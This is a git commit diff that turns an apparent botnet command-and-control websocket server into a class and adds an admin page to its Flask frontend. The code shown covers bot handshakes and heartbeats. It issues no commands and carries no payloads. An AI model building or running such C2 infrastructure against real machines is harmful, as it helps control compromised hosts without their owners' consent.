6e30c9e30bb1e8afc4e7fc654e13ec803406c757
Luiz Melo <zberyt@gmail.com>
2022-04-22 19:15:50 -0300

    admin page, OOP no server e +

--- c2_server/server.py
+++ c2_server/server.py
@@ -4,109 +4,119 @@ import websockets
 import random
 import json
 
-server_ip = 'localhost'
-server_port = 8765
+class C2Server:
+    def __init__(self, server_ip='localhost', server_port=8765):
+        self.server_ip = server_ip
+        self.server_port = server_port
+        self.alive_bots = [] # list of bots that are still alive, responding to heartbeat
 
-alive_bots = [] # list of bots that are still alive, responding to heartbeat
 
-async def parse_message(websocket):
-    while True:
-        try:
-            message = await websocket.recv()
-            message = json.loads(message) # convert to json
-            if message:
-                if message['type'] == 'handshake_pong':
-                    client_name = message['client_name']
-                    client_checksum = message['checksum']
-                    if len(client_name) >= 4 and len(client_checksum) == 16:
-                        await finish_handshake(websocket, client_name, message['checksum'])
+    async def parse_message(self, websocket):
+        while True:
+            try:
+                message = await websocket.recv()
+                message = json.loads(message) # convert to json
+                if message:
+                    if message['type'] == 'handshake_pong':
+                        client_name = message['client_name']
+                        client_checksum = message['checksum']
+                        if len(client_name) >= 4 and len(client_checksum) == 16:
+                            await self.finish_handshake(websocket, client_name, message['checksum'])
+
+                        else:
+                            print('EASTER EGG') # todo  
 
                     else:
-                        print('EASTER EGG') # todo  
+                        raise Exception(f'[C] unknown message type: {message}')
 
+            except Exception as e:
+                if 'no close frame received or sent' in str(e) or 'received 1000 (OK); then sent 1000 (OK)' in str(e):
+                    print(f'[C] {client_name} connection closed')
+                    break
                 else:
-                    raise Exception(f'[C] unknown message type: {message}')
+                    #print(f'[S] server error on parse_message: {str(e)}')
+                    break
 
-        except Exception as e:
-            if 'no close frame received or sent' in str(e) or 'received 1000 (OK); then sent 1000 (OK)' in str(e):
-                print(f'[C] {client_name} connection closed')
+    # heatbeat function that sends a message from the server to the client every second
+    async def heartbeat(self, websocket, client_name):
+        print(f'[S] starting heartbeat to {client_name}')
+        while True:
+            try:
+                await asyncio.sleep(1)
+                if websocket in self.alive_bots:
+                    heartbeat_seed = random.randint(10000, 99999)
+                    heartbeat_message = {"type":"heartbeat_ping", "seed": heartbeat_seed, "payload": ""}
+                    heartbeat_message = json.dumps(heartbeat_message)
+                    await websocket.send(heartbeat_message)
+                    print(f'[S] heartbeat to {client_name} - {heartbeat_seed}')
+
+                    response = await websocket.recv()
+                    response = json.loads(response)
+                    if response['type'] == 'heartbeat_pong':
+                        if response['pow'] == str(heartbeat_seed)[::-1]:
+                            print(f'[C] {client_name} alive')
+
+                        else:
+                            print(f'[S] {client_name} dead')
+                            self.alive_bots.remove(websocket)
+                            break
+
+
+            except Exception as e:
+                if 'received 1000' in str(e) or 'going away' in str(e):
+                    print(f'[C] {client_name} disconnected')
+                    self.alive_bots.remove(websocket)
+                else:
+                    print(f'[S] server error on heartbeat: {str(e)}')
                 break
-            else:
-                #print(f'[S] server error on parse_message: {str(e)}')
-                break
-
-# heatbeat function that sends a message from the server to the client every second
-async def heartbeat(websocket, client_name):
-    print(f'[S] starting heartbeat to {client_name}')
-    while True:
-        try:
-            await asyncio.sleep(1)
-            if websocket in alive_bots:
-                heartbeat_seed = random.randint(10000, 99999)
-                heartbeat_message = {"type":"heartbeat_ping", "seed": heartbeat_seed, "payload": ""}
-                heartbeat_message = json.dumps(heartbeat_message)
-                await websocket.send(heartbeat_message)
-                print(f'[S] heartbeat to {client_name} - {heartbeat_seed}')
-
-                response = await websocket.recv()
-                response = json.loads(response)
-                if response['type'] == 'heartbeat_pong':
-                    if response['pow'] == str(heartbeat_seed)[::-1]:
-                        print(f'[C] {client_name} alive')
-
-                    else:
-                        print(f'[S] {client_name} dead')
-                        alive_bots.remove(websocket)
-                        break
 
 
-        except Exception as e:
-            if 'received 1000' in str(e) or 'going away' in str(e):
-                print(f'[C] {client_name} disconnected')
-                alive_bots.remove(websocket)
-            else:
-                print(f'[S] server error on heartbeat: {str(e)}')
-            break
+    async def finish_handshake(self, websocket, client_name, client_checksum) -> bool:
+        print(f'[C] received handshake_pong - {client_name}')
+        server_checksum = hashlib.sha256(client_name.encode()).hexdigest()[:16]
 
-async def finish_handshake(websocket, client_name, client_checksum) -> bool:
-    print(f'[C] received handshake_pong - {client_name}')
-    server_checksum = hashlib.sha256(client_name.encode()).hexdigest()[:16]
+        if client_checksum == server_checksum:
+            handshake_success = {"type":"handshake_success", "checksum": server_checksum}
+            print(f'[S] sending handshake_success - {server_checksum}')
 
-    if client_checksum == server_checksum:
-        handshake_success = {"type":"handshake_success", "checksum": server_checksum}
-        print(f'[S] sending handshake_success - {server_checksum}')
-
-    else:
-        handshake_success = {"type":"handshake_fail", "server_checksum": server_checksum, "client_checksum": client_checksum}
-        print(f'[S] sending handshake_fail - {server_checksum}/{client_checksum}')
+        else:
+            handshake_success = {"type":"handshake_fail", "server_checksum": server_checksum, "client_checksum": client_checksum}
+            print(f'[S] sending handshake_fail - {server_checksum}/{client_checksum}')
 
 
-    handshake_success = json.dumps(handshake_success)
-    await websocket.send(handshake_success)
-    print(f'[S] {client_name} alive - starting heartbeat')
-    alive_bots.append(websocket)
-    await heartbeat(websocket, client_name)
+        handshake_success = json.dumps(handshake_success)
+        await websocket.send(handshake_success)
+        print(f'[S] {client_name} alive - starting heartbeat')
+        self.alive_bots.append(websocket)
+        await self.heartbeat(websocket, client_name)
 
 
-async def start_handshake(websocket):
-    server_key = "".join([random.choice('abcdef0123456789') for _ in range(4)])     
+    async def start_handshake(self, websocket):
+        server_key = "".join([random.choice('abcdef0123456789') for _ in range(4)])     
 
-    handshake_ping = {"type":"handshake_ping", "server_key": server_key}
-    handshake_ping = json.dumps(handshake_ping)
+        handshake_ping = {"type":"handshake_ping", "server_key": server_key}
+        handshake_ping = json.dumps(handshake_ping)
 
-    print(f'[S] sending handshake_ping - {server_key}')
-    await websocket.send(handshake_ping)
-    print(f'[S] waiting for handshake_pong with client_name')
+        print(f'[S] sending handshake_ping - {server_key}')
+        await websocket.send(handshake_ping)
+        print(f'[S] waiting for handshake_pong with client_name')
 
-    await parse_message(websocket)
+        await self.parse_message(websocket)
 
 
-async def handler(websocket):
-    print(f'[C] new websocket connection')
-    await start_handshake(websocket)
+    async def handler(self, websocket):
+        print(f'[C] new websocket connection')
+        await self.start_handshake(websocket)
 
-async def main():
-    async with websockets.serve(handler, server_ip, server_port):
-        await asyncio.Future()  # run forever
 
-asyncio.run(main())
+    async def main(self):
+        async with websockets.serve(self.handler, self.server_ip, self.server_port):
+            await asyncio.Future()  # run forever
+
+    def start_c2(self):
+        asyncio.run(self.main())
+
+
+if __name__ == '__main__':
+    c2_server = C2Server()
+    c2_server.start_c2()
--- frontend/app.py
+++ frontend/app.py
@@ -3,14 +3,22 @@
 from flask import Flask, render_template
 
 name = 'zumbi'
-
 app = Flask(name)
+
 
 @app.route("/")
 def index():
     return render_template('./index.html')
 
 
+@app.route("/admin")
+def admin():
+    return render_template('./admin.html')
+
+
+def start_webapp():
+    app.run(host='0.0.0.0', port=4002, ssl_context='adhoc')
+
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=4002, debug=True, ssl_context='adhoc')
+    start_webapp()
